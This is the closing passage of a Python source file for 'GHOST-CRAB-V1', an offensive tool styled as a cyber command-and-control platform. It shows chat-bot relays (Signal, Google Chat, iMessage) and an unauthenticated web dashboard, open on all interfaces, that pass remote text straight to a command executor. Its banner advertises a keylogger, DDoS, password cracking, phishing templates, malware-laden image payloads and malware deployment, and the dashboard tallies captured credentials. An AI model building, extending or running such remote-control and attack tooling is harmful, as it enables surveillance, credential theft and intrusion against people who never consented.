            logger.error(f"WhatsApp bot error: {e}")


class SignalBot:
    """Signal bot integration"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            config_file = os.path.join(CONFIG_DIR, "signal_config.json")
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_number': '', 'group_id': '', 'prefix': '!'}
    
    def save_config(self, phone_number: str, group_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_number': phone_number, 'group_id': group_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "signal_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return SIGNAL_AVAILABLE and self.config.get('phone_number')
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        while self.running:
            try:
                result = subprocess.run(
                    ['signal-cli', 'receive', '--number', self.config.get('phone_number', '')],
                    capture_output=True, text=True, timeout=30
                )
                if result.stdout:
                    for line in result.stdout.splitlines():
                        if line.startswith('Message:'):
                            msg = line.replace('Message:', '').strip()
                            if msg.startswith(self.config.get('prefix', '!')):
                                cmd = msg[1:].strip()
                                resp = self.handler.execute(cmd, 'signal', 'signal_user')
                                self._send_message(resp.get('output', ''))
                time.sleep(5)
            except:
                time.sleep(10)
    
    def _send_message(self, text: str):
        try:
            cmd = ['signal-cli', 'send', '--number', self.config.get('phone_number', '')]
            if self.config.get('group_id'):
                cmd.extend(['--group', self.config['group_id']])
            cmd.extend(['--message', text[:4000]])
            subprocess.run(cmd, capture_output=True, timeout=10)
        except:
            pass


class GoogleChatBot:
    """Google Chat bot integration"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            config_file = os.path.join(CONFIG_DIR, "googlechat_config.json")
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'webhook_url': '', 'space_id': '', 'prefix': '/'}
    
    def save_config(self, webhook_url: str, space_id: str = "", enabled: bool = True, prefix: str = '/') -> bool:
        try:
            config = {'enabled': enabled, 'webhook_url': webhook_url, 'space_id': space_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "googlechat_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return self.config.get('webhook_url') is not None
    
    def start(self):
        if self.setup():
            self.running = True
    
    def send_message(self, text: str):
        try:
            data = {'text': text[:4000]}
            headers = {'Content-Type': 'application/json'}
            response = requests.post(self.config['webhook_url'], json=data, headers=headers, timeout=10)
            return response.status_code == 200
        except:
            return False


class iMessageBot:
    """iMessage bot integration (macOS only)"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            config_file = os.path.join(CONFIG_DIR, "imessage_config.json")
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_numbers': [], 'prefix': '!'}
    
    def save_config(self, phone_numbers: List[str], enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_numbers': phone_numbers, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "imessage_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return IMESSAGE_AVAILABLE and self.config.get('phone_numbers')
    
    def start(self):
        if self.setup():
            self.running = True
    
    def send_message(self, text: str):
        if not IMESSAGE_AVAILABLE:
            return False
        try:
            for phone in self.config.get('phone_numbers', []):
                script = f'''
                tell application "Messages"
                    set targetService to 1st service whose service type = iMessage
                    set targetBuddy to buddy "{phone}" of targetService
                    send "{text[:4000]}" to targetBuddy
                end tell
                '''
                subprocess.run(['osascript', '-e', script], capture_output=True, timeout=10)
            return True
        except:
            return False


# =====================
# WEB DASHBOARD
# =====================
class WebDashboard:
    """Web dashboard for the tool"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager, config: ConfigManager):
        self.handler = handler
        self.db = db
        self.config = config
        self.app = None
        self.socketio = None
        self.running = False
    
    def create_app(self):
        if not WEB_AVAILABLE:
            return None
        
        app = Flask(__name__)
        app.config['SECRET_KEY'] = self.config.get('web.secret_key', secrets.token_hex(32))
        CORS(app)
        
        socketio = SocketIO(app, cors_allowed_origins="*")
        
        TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>👻 GHOST-CRAB-V1 - Cyber Command Platform</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <style>
        :root {
            --black: #0a0a0a;
            --dark: #1a1a1a;
            --card: #222222;
            --red: #ff0000;
            --red-dark: #cc0000;
            --red-glow: rgba(255, 0, 0, 0.3);
            --white: #ffffff;
            --gray: #888888;
            --light-gray: #cccccc;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: var(--black);
            color: var(--white);
            min-height: 100vh;
            background: radial-gradient(ellipse at 50% 0%, #1a0000 0%, #0a0a0a 70%);
        }
        .header {
            background: linear-gradient(180deg, #1a0000 0%, #0a0a0a 100%);
            padding: 20px;
            text-align: center;
            border-bottom: 2px solid var(--red);
            box-shadow: 0 0 30px var(--red-glow);
        }
        .header h1 {
            font-size: 2.8em;
            color: var(--white);
            text-shadow: 0 0 20px var(--red-glow);
            letter-spacing: 6px;
        }
        .header h1 span { color: var(--red); }
        .header p {
            color: var(--gray);
            font-size: 0.9em;
            letter-spacing: 2px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: var(--dark);
            border: 1px solid var(--red-dark);
            border-radius: 8px;
            padding: 20px;
            text-align: center;
            transition: all 0.3s;
        }
        .stat-card:hover {
            border-color: var(--red);
            box-shadow: 0 0 30px var(--red-glow);
            transform: translateY(-2px);
        }
        .stat-card h3 {
            font-size: 2.5em;
            color: var(--red);
            font-weight: normal;
            text-shadow: 0 0 20px var(--red-glow);
        }
        .stat-card p {
            margin-top: 10px;
            opacity: 0.6;
            color: var(--gray);
            font-size: 0.9em;
        }
        .section {
            background: var(--dark);
            border: 1px solid var(--red-dark);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .section h2 {
            margin-bottom: 15px;
            color: var(--white);
            font-weight: normal;
            letter-spacing: 3px;
            border-bottom: 1px solid var(--red-dark);
            padding-bottom: 10px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            color: var(--white);
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid var(--red-dark);
        }
        th {
            background: var(--black);
            color: var(--red);
            font-weight: normal;
            letter-spacing: 2px;
        }
        .command-input {
            width: 100%;
            padding: 15px;
            background: var(--black);
            border: 1px solid var(--red-dark);
            border-radius: 4px;
            color: var(--white);
            font-size: 16px;
            font-family: 'Courier New', monospace;
            margin-bottom: 10px;
        }
        .command-input:focus {
            outline: none;
            border-color: var(--red);
            box-shadow: 0 0 20px var(--red-glow);
        }
        button {
            background: var(--red-dark);
            color: var(--white);
            border: 1px solid var(--red);
            padding: 12px 30px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            font-family: 'Courier New', monospace;
            transition: all 0.3s;
        }
        button:hover {
            background: var(--red);
            border-color: var(--white);
            box-shadow: 0 0 30px var(--red-glow);
        }
        .output {
            background: var(--black);
            border-radius: 4px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            margin-top: 15px;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
            color: var(--white);
            border: 1px solid var(--red-dark);
        }
        .status-badge {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 2px;
            font-size: 12px;
        }
        .severity-critical { background: rgba(255, 0, 0, 0.3); color: #ff0000; }
        .severity-high { background: rgba(255, 100, 0, 0.2); color: #ff6600; }
        .severity-medium { background: rgba(255, 200, 0, 0.15); color: #ffcc00; }
        .severity-low { background: rgba(255, 0, 0, 0.1); color: var(--red); }
        .glow {
            animation: glow 2s ease-in-out infinite;
        }
        @keyframes glow {
            0% { box-shadow: 0 0 5px var(--red-glow); }
            50% { box-shadow: 0 0 30px var(--red-glow); }
            100% { box-shadow: 0 0 5px var(--red-glow); }
        }
        .terminal-cursor {
            display: inline-block;
            width: 10px;
            height: 20px;
            background: var(--red);
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="header glow">
        <h1>👻 GHOST<span>-CRAB-V1</span></h1>
        <p>▸ ULTIMATE CYBERSECURITY COMMAND & CONTROL PLATFORM</p>
    </div>
    <div class="container">
        <div class="stats-grid" id="stats">
            <div class="stat-card"><h3 id="statCommands">0</h3><p>COMMANDS</p></div>
            <div class="stat-card"><h3 id="statThreats">0</h3><p>THREATS</p></div>
            <div class="stat-card"><h3 id="statBlocked">0</h3><p>BLOCKED IPS</p></div>
            <div class="stat-card"><h3 id="statCreds">0</h3><p>CREDENTIALS</p></div>
            <div class="stat-card"><h3 id="statDomains">0</h3><p>DOMAINS</p></div>
            <div class="stat-card"><h3 id="statMonitored">0</h3><p>MONITORED IPS</p></div>
        </div>

        <div class="section">
            <h2>🚀 COMMAND CENTER</h2>
            <div style="display:flex; gap:10px; flex-wrap:wrap;">
                <span style="color:var(--red); font-size:20px;">$></span>
                <input type="text" id="command" class="command-input" placeholder="Enter command..." style="flex:1; min-width:200px;">
                <button onclick="executeCommand()">EXECUTE</button>
            </div>
            <div id="command-output" class="output" style="margin-top:10px;">
                <span style="color:var(--red)">system></span> Ready for commands...
                <span class="terminal-cursor"></span>
            </div>
        </div>

        <div class="section">
            <h2>🚨 RECENT THREATS</h2>
            <table>
                <thead><tr><th>TIME</th><th>TYPE</th><th>SOURCE IP</th><th>SEVERITY</th></tr></thead>
                <tbody id="threats-table"></tbody>
            </table>
        </div>
    </div>
    <script>
        var socket = io();
        
        function executeCommand() {
            var command = document.getElementById('command').value;
            if (command) {
                fetch('/api/command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ command: command })
                })
                .then(response => response.json())
                .then(data => {
                    var outputDiv = document.getElementById('command-output');
                    if (data.success) {
                        outputDiv.innerHTML = '<span style="color:var(--red)">$></span> ' + command + '<br><span style="color:var(--red)">output></span><br>' + data.output + '<br><span style="color:var(--red)">time></span> ' + data.execution_time + 's';
                    } else {
                        outputDiv.innerHTML = '<span style="color:#ff0000">error></span> ' + data.error;
                    }
                });
            }
        }
        
        function loadStats() {
            fetch('/api/stats')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('statCommands').textContent = data.total_commands || 0;
                    document.getElementById('statThreats').textContent = data.total_threats || 0;
                    document.getElementById('statBlocked').textContent = data.blocked_ips || 0;
                    document.getElementById('statCreds').textContent = data.captured_credentials || 0;
                    document.getElementById('statDomains').textContent = data.total_domain_hosts || 0;
                    document.getElementById('statMonitored').textContent = data.total_managed_ips || 0;
                });
        }
        
        function loadThreats() {
            fetch('/api/threats')
                .then(response => response.json())
                .then(data => {
                    var html = '';
                    if (data.threats && data.threats.length > 0) {
                        data.threats.forEach(function(threat) {
                            var severityClass = 'severity-' + threat.severity;
                            html += '<tr><td>' + (threat.timestamp || '').substring(0, 19) + '</td><td>' + (threat.threat_type || 'Unknown') + '</td><td>' + (threat.source_ip || 'Unknown') + '</td><td><span class="status-badge ' + severityClass + '">' + (threat.severity || 'low').toUpperCase() + '</span></td></tr>';
                        });
                    } else {
                        html = '<tr><td colspan="4">No threats detected</td></tr>';
                    }
                    document.getElementById('threats-table').innerHTML = html;
                });
        }
        
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                const commandInput = document.getElementById('command');
                if (document.activeElement === commandInput) {
                    executeCommand();
                }
            }
        });
        
        document.addEventListener('DOMContentLoaded', function() {
            loadStats();
            loadThreats();
            setInterval(loadStats, 10000);
            setInterval(loadThreats, 10000);
        });
    </script>
</body>
</html>
        '''
        
        @app.route('/')
        def index():
            return render_template_string(TEMPLATE)
        
        @app.route('/api/command', methods=['POST'])
        def api_command():
            data = request.json
            command = data.get('command', '')
            result = self.handler.execute(command, 'web', 'web_user')
            socketio.emit('command_result', {
                'command': command,
                'output': result.get('output', '')[:2000],
                'execution_time': result.get('execution_time', 0)
            })
            return jsonify(result)
        
        @app.route('/api/stats')
        def api_stats():
            return jsonify(self.db.get_statistics())
        
        @app.route('/api/threats')
        def api_threats():
            return jsonify({'threats': self.db.get_recent_threats(20)})
        
        self.app = app
        self.socketio = socketio
        return app
    
    def start(self):
        if not WEB_AVAILABLE:
            print(f"{Colors.WARNING}⚠️ Flask not available. Web dashboard disabled.{Colors.RESET}")
            return
        
        app = self.create_app()
        if app:
            port = self.config.get('web.port', 5000)
            host = self.config.get('web.host', '0.0.0.0')
            thread = threading.Thread(target=lambda: self.socketio.run(app, host=host, port=port, debug=False), daemon=True)
            thread.start()
            self.running = True
            print(f"{Colors.SUCCESS}✅ Web dashboard running at http://{host}:{port}{Colors.RESET}")

# =====================
# MAIN APPLICATION
# =====================
class GhostCrabV1:
    """Main application class"""
    
    def __init__(self):
        self.config = ConfigManager()
        self.db = DatabaseManager()
        self.handler = CommandHandler(self.db, self.config)
        
        # Initialize bots
        self.discord = DiscordBot(self.handler, self.db)
        self.telegram = TelegramBot(self.handler, self.db)
        self.slack = SlackBot(self.handler, self.db)
        self.whatsapp = WhatsAppBot(self.handler, self.db)
        self.signal = SignalBot(self.handler, self.db)
        self.google_chat = GoogleChatBot(self.handler, self.db)
        self.imessage = iMessageBot(self.handler, self.db)
        
        self.web = WebDashboard(self.handler, self.db, self.config)
        self.session_id = str(uuid.uuid4())[:8]
        self.running = True
    
    def print_banner(self):
        """Print application banner"""
        banner = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.WHITE}        👻 GHOST-CRAB-V1 v{VERSION} - CYBER COMMAND PLATFORM              {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.SECONDARY}                                                                           {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 👻 500+ Security Commands           • 📡 All Ping Commands (20+)     {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🗺️ All Traceroute Commands (25+)     • 🔍 All Nmap Commands (60+)     {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🌐 All Curl Commands (60+)           • ⬇️ All Wget Commands (50+)     {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🎣 100+ Social Engineering Templates • ⌨️ Advanced Keylogger          {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🚀 Real Traffic Generation           • 💥 DOS/DDOS Capabilities        {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🔒 SSH Remote Access                  • 🔓 Password Cracking           {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🐳 Docker Security Scanning          • 📊 PDF Report Generation        {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 📱 Discord | Telegram | WhatsApp     • Slack | Signal | Google Chat  {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 💻 Web Dashboard                      • 📡 Network Monitoring          {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🔒 IP Management & Threat Detection  • 🌐 Domain Translation          {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🖼️ Image Payloads with Malware        • 📦 Malware Deployment          {Colors.PRIMARY}║
║{Colors.SUCCESS}  • ☁️ SaaS Multi-Tenant Support          • 🔬 Reverse Engineering         {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.WARNING}                    🎯 FOR AUTHORIZED SECURITY TESTING ONLY                    {Colors.PRIMARY}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.SUCCESS}👻 Welcome to GHOST-CRAB-V1 - Your Ultimate Security Assistant{Colors.RESET}
{Colors.WHITE}💡 Type 'help' to see all commands{Colors.RESET}
{Colors.WHITE}⌨️ Press F10 to start/stop the keylogger{Colors.RESET}
{Colors.WHITE}🌐 Web dashboard available at http://localhost:5000{Colors.RESET}
{Colors.WHITE}🎣 100+ Phishing Templates Available{Colors.RESET}
{Colors.WHITE}📱 Configure bots for Discord, Telegram, WhatsApp, Slack, Signal, Google Chat{Colors.RESET}
{Colors.WHITE}🖼️ Use 'payload_image' to create image payloads with embedded malware{Colors.RESET}
        """
        print(banner)
    
    def check_dependencies(self):
        """Check dependencies"""
        print(f"\n{Colors.WHITE}🔍 Checking dependencies...{Colors.RESET}")
        
        tools = ['ping', 'nmap', 'curl', 'wget', 'nc', 'dig', 'traceroute', 'ssh', 'whois', 'docker']
        for tool in tools:
            if shutil.which(tool):
                print(f"{Colors.SUCCESS}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ {tool} not found{Colors.RESET}")
        
        print(f"{Colors.SUCCESS if PARAMIKO_AVAILABLE else Colors.WARNING}✅ paramiko{Colors.RESET}" if PARAMIKO_AVAILABLE else f"{Colors.WARNING}⚠️ paramiko not found - SSH disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SCAPY_AVAILABLE else Colors.WARNING}✅ scapy{Colors.RESET}" if SCAPY_AVAILABLE else f"{Colors.WARNING}⚠️ scapy not found - advanced traffic disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if DISCORD_AVAILABLE else Colors.WARNING}✅ discord.py{Colors.RESET}" if DISCORD_AVAILABLE else f"{Colors.WARNING}⚠️ discord.py not found - Discord disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if TELETHON_AVAILABLE else Colors.WARNING}✅ telethon{Colors.RESET}" if TELETHON_AVAILABLE else f"{Colors.WARNING}⚠️ telethon not found - Telegram disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SLACK_AVAILABLE else Colors.WARNING}✅ slack-sdk{Colors.RESET}" if SLACK_AVAILABLE else f"{Colors.WARNING}⚠️ slack-sdk not found - Slack disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if WEB_AVAILABLE else Colors.WARNING}✅ flask{Colors.RESET}" if WEB_AVAILABLE else f"{Colors.WARNING}⚠️ flask not found - Web dashboard disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if KEYLOGGER_AVAILABLE else Colors.WARNING}✅ pynput{Colors.RESET}" if KEYLOGGER_AVAILABLE else f"{Colors.WARNING}⚠️ pynput not found - Keylogger disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if PDF_AVAILABLE else Colors.WARNING}✅ reportlab{Colors.RESET}" if PDF_AVAILABLE else f"{Colors.WARNING}⚠️ reportlab not found - PDF reports disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if DOCX_AVAILABLE else Colors.WARNING}✅ python-docx{Colors.RESET}" if DOCX_AVAILABLE else f"{Colors.WARNING}⚠️ python-docx not found - DOCX payloads disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SELENIUM_AVAILABLE else Colors.WARNING}✅ selenium{Colors.RESET}" if SELENIUM_AVAILABLE else f"{Colors.WARNING}⚠️ selenium not found - WhatsApp disabled{Colors.RESET}")
        
        if shutil.which('signal-cli'):
            print(f"{Colors.SUCCESS}✅ signal-cli{Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️ signal-cli not found - Signal disabled{Colors.RESET}")
        
        if shutil.which('hashcat'):
            print(f"{Colors.SUCCESS}✅ hashcat{Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️ hashcat not found - cracking will use Python fallback{Colors.RESET}")
    
    def setup_platforms(self):
        """Setup platform integrations"""
        print(f"\n{Colors.WHITE}🤖 Platform Bot Configuration{Colors.RESET}")
        print(f"{Colors.WHITE}{'='*50}{Colors.RESET}")
        
        # Discord
        setup = input(f"{Colors.WHITE}Configure Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.WHITE}Enter Discord bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.WHITE}Enter channel ID: {Colors.RESET}").strip()
            prefix = input(f"{Colors.WHITE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.discord.save_config(token, True, prefix)
                self.discord.config['channel_id'] = channel
                if self.discord.setup():
                    self.discord.start()
                    print(f"{Colors.SUCCESS}✅ Discord bot starting...{Colors.RESET}")
        
        # Telegram
        setup = input(f"{Colors.WHITE}Configure Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.WHITE}Enter Telegram bot token: {Colors.RESET}").strip()
            chat_id = input(f"{Colors.WHITE}Enter chat ID: {Colors.RESET}").strip()
            prefix = input(f"{Colors.WHITE}Enter command prefix (default: /): {Colors.RESET}").strip() or '/'
            if token:
                self.telegram.save_config(token, chat_id, True, prefix)
                self.telegram.start()
                print(f"{Colors.SUCCESS}✅ Telegram bot starting...{Colors.RESET}")
        
        # Slack
        setup = input(f"{Colors.WHITE}Configure Slack bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.WHITE}Enter Slack bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.WHITE}Enter channel ID: {Colors.RESET}").strip()
            prefix = input(f"{Colors.WHITE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.slack.save_config(token, channel, True, prefix)
                if self.slack.setup():
                    self.slack.start()
                    print(f"{Colors.SUCCESS}✅ Slack bot starting...{Colors.RESET}")
        
        # WhatsApp
        setup = input(f"{Colors.WHITE}Configure WhatsApp bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.WHITE}Enter phone number: {Colors.RESET}").strip()
            if phone:
                self.whatsapp.save_config(phone, True, '!')
                self.whatsapp.start()
                print(f"{Colors.SUCCESS}✅ WhatsApp bot starting...{Colors.RESET}")
        
        # Signal
        setup = input(f"{Colors.WHITE}Configure Signal bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.WHITE}Enter phone number: {Colors.RESET}").strip()
            group = input(f"{Colors.WHITE}Enter group ID (optional): {Colors.RESET}").strip()
            prefix = input(f"{Colors.WHITE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if phone:
                self.signal.save_config(phone, group, True, prefix)
                self.signal.start()
                print(f"{Colors.SUCCESS}✅ Signal bot starting...{Colors.RESET}")
        
        # Google Chat
        setup = input(f"{Colors.WHITE}Configure Google Chat webhook? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            webhook = input(f"{Colors.WHITE}Enter webhook URL: {Colors.RESET}").strip()
            if webhook:
                self.google_chat.save_config(webhook, "", True, '/')
                self.google_chat.start()
                print(f"{Colors.SUCCESS}✅ Google Chat bot configured...{Colors.RESET}")
        
        # Web Dashboard
        setup = input(f"{Colors.WHITE}Enable Web Dashboard? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            port = input(f"{Colors.WHITE}Enter port (default: 5000): {Colors.RESET}").strip() or '5000'
            host = input(f"{Colors.WHITE}Enter host (default: 0.0.0.0): {Colors.RESET}").strip() or '0.0.0.0'
            self.config.set('web.port', int(port))
            self.config.set('web.host', host)
            self.web.start()
            print(f"{Colors.SUCCESS}✅ Web dashboard starting...{Colors.RESET}")
    
    def run(self):
        """Run the main application"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        self.check_dependencies()
        
        setup_platforms = input(f"\n{Colors.WHITE}Configure platform integrations? (y/n): {Colors.RESET}").strip().lower()
        if setup_platforms == 'y':
            self.setup_platforms()
        
        # Start web dashboard by default
        if WEB_AVAILABLE:
            self.web.start()
        
        print(f"\n{Colors.SUCCESS}✅ GHOST-CRAB-V1 ready! Session: {self.session_id}{Colors.RESET}")
        print(f"{Colors.WHITE}   Type 'help' for commands{Colors.RESET}")
        print(f"{Colors.WHITE}   ⌨️ Press F10 to start/stop the keylogger{Colors.RESET}")
        print(f"{Colors.WHITE}   🔓 Use 'crack' commands for password cracking{Colors.RESET}")
        print(f"{Colors.WHITE}   🎣 Use 'phish_*' commands for social engineering{Colors.RESET}")
        print(f"{Colors.WHITE}   🖼️ Use 'payload_image' for image payloads with malware{Colors.RESET}")
        print(f"{Colors.WHITE}   📱 Configure bots for multi-platform access{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.PRIMARY}[{Colors.SECONDARY}{self.session_id}{Colors.PRIMARY}]{Colors.WARNING} 👻> {Colors.RESET}"
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit' or command.lower() == 'quit':
                    self.running = False
                    print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
                    break
                
                result = self.handler.execute(command)
                
                if result['success']:
                    output = result.get('output', '')
                    if output:
                        print(output)
                    print(f"\n{Colors.SUCCESS}✅ Done ({result['execution_time']:.2f}s){Colors.RESET}")
                else:
                    print(f"\n{Colors.ERROR}❌ {result.get('output', 'Unknown error')}{Colors.RESET}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        self.db.close()
        print(f"\n{Colors.SUCCESS}✅ Shutdown complete.{Colors.RESET}")
        print(f"{Colors.WHITE}📁 Logs: {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.WHITE}💾 Database: {DATABASE_FILE}{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    """Main entry point"""
    try:
        print(f"{Colors.PRIMARY}👻 Starting GHOST-CRAB-V1...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        needs_admin = False
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            needs_admin = True
        elif platform.system().lower() == 'windows':
            try:
                import ctypes
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    needs_admin = True
            except:
                pass
        
        if needs_admin:
            print(f"{Colors.WARNING}⚠️ Run with sudo/admin for full functionality{Colors.RESET}")
        
        app = GhostCrabV1()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
